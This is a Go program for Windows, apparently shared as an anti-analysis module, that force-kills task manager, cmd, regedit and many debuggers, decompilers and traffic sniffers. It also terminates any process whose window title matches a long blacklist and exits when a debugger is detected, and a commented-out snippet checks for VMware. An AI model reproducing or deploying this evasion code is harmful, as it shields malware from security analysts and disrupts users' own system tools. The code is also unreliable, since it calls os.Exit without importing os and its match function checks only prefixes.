package main

import (
	"fmt"
	"syscall"
	"unsafe"
	"os/exec"
)
/* 
ANTIDEBUG CODED MY EVILBYTECODE / CODEPULZE
FEATURES:
Blocks Traffic Debuggers and Debuggers (can by bypassed by renaming executable)
It Checks for blacklisted Window Names and closes them
Detects IsDebuggerPresent (scyllabypasses) 
*/
var (
	mu32   = syscall.NewLazyDLL("user32.dll")
	pew          = mu32.NewProc("EnumWindows")
	pgwt       = mu32.NewProc("GetWindowTextA")
	pgwtp = mu32.NewProc("GetWindowThreadProcessId")
	mk32 = syscall.NewLazyDLL("kernel32.dll")
	pop         = mk32.NewProc("OpenProcess")
	ptp    = mk32.NewProc("TerminateProcess")
	pch         = mk32.NewProc("CloseHandle")
	pidp = mk32.NewProc("IsDebuggerPresent")

)

func main() {
	ptk := []string{"cmd.exe", "taskmgr.exe", "process.exe", "processhacker.exe", "ksdumper.exe", "fiddler.exe", "httpdebuggerui.exe", "wireshark.exe", "httpanalyzerv7.exe", "fiddler.exe", "decoder.exe", "regedit.exe", "procexp.exe", "dnspy.exe", "vboxservice.exe", "burpsuit.exe", "DbgX.Shell.exe", "ILSpy.exe"}

	for _, prg := range ptk {
		exec.Command("taskkill", "/F", "/IM", prg).Run()
	}


	ewp := syscall.NewCallback(ewpg)
	ret, _, _ := pew.Call(ewp, 0)
	if ret == 0 {
		fmt.Println("EW failed idiot")
	}
    flag, _, _ := pidp.Call()
    if flag != 0 {
        os.Exit(-1)
    }
}

func ewpg(hwnd uintptr, lParam uintptr) uintptr {
	var pid uint32
	pgwtp.Call(hwnd, uintptr(unsafe.Pointer(&pid)))

	var title [256]byte
	pgwt.Call(hwnd, uintptr(unsafe.Pointer(&title)), 256)
	wt := string(title[:])

	bs := []string{
		"proxifier", "graywolf", "extremedumper", "zed", "exeinfope", "dnspy",
		"titanHide", "ilspy", "titanhide", "x32dbg", "codecracker", "simpleassembly",
		"process hacker 2", "pc-ret", "http debugger", "Centos", "process monitor",
		"debug", "ILSpy", "reverse", "simpleassemblyexplorer", "process", "de4dotmodded",
		"dojandqwklndoqwd-x86", "sharpod", "folderchangesview", "fiddler", "die", "pizza",
		"crack", "strongod", "ida -", "brute", "dump", "StringDecryptor", "wireshark",
		"debugger", "httpdebugger", "gdb", "kdb", "x64_dbg", "windbg", "x64netdumper",
		"petools", "scyllahide", "megadumper", "reversal", "ksdumper v1.1 - by equifox",
		"dbgclr", "HxD", "monitor", "peek", "ollydbg", "ksdumper", "http", "wpe pro", "dbg",
		"httpanalyzer", "httpdebug", "PhantOm", "kgdb", "james", "x32_dbg", "proxy", "phantom",
		"mdbg", "WPE PRO", "system explorer", "de4dot", "x64dbg", "X64NetDumper", "protection_id",
		"charles", "systemexplorer", "pepper", "hxd", "procmon64", "MegaDumper", "ghidra", "xd",
		"0harmony", "dojandqwklndoqwd", "hacker", "process hacker", "SAE", "mdb", "checker",
		"harmony", "Protection_ID", "PETools", "scyllaHide", "x96dbg", "systemexplorerservice",
		"folder", "mitmproxy", "dbx", "sniffer", "Process Hacker",
	}

	for _, str := range bs {
		if contains(wt, str) {
			proc, _, _ := pop.Call(syscall.PROCESS_TERMINATE, 0, uintptr(pid))
			if proc != 0 {
				ptp.Call(proc, 0)
				pch.Call(proc)
			}
			syscall.Exit(0)
		}
	}

	return 1
}

func contains(s, substr string) bool {
	return len(s) >= len(substr) && s[:len(substr)] == substr
}

/*
NOT MY CODE CREDITS TO: SARAH
================================
func vmwareRegKeys() (bool, error) {
    keys := []string{
        `SOFTWARE\VMware, Inc.\VMware Tools`,
    }

    for _, key := range keys {
        if regKeyExists(registry.LOCAL_MACHINE, key) {
            return true, nil
        }
    }

    return false, nil
}

func regKeyExists(hive registry.Key, key string) bool {
    k, err := registry.OpenKey(hive, key, registry.READ)
    if err != nil {
        return false
    }
    defer k.Close()
    return true
}
*/
